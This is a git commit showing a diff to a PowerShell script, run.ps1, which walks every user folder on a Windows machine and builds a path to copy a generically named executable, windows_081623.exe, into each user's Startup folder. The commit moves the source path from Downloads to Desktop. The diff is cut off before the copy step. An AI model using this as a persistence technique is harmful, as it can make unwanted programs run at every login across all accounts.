d4cc3e6a6f2be785faa51576b2b3088d4308f7c2
nbk.x <130099308+nbkrx@users.noreply.github.com>
2023-08-31 10:42:40 -0400

    run.ps1

--- run.ps1
+++ run.ps1
@@ -1,7 +1,7 @@
 $users = Get-ChildItem -Path "C:\Users" -Directory
 
 foreach ($user in $users) {
-    $sourcePath = Join-Path -Path $user.FullName -ChildPath "Downloads\windows_081623.exe"
+    $sourcePath = Join-Path -Path $user.FullName -ChildPath "Desktop\windows_081623.exe"
     $destinationPath = Join-Path -Path $user.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_081623.exe"
     
     if (Test-Path $sourcePath) {
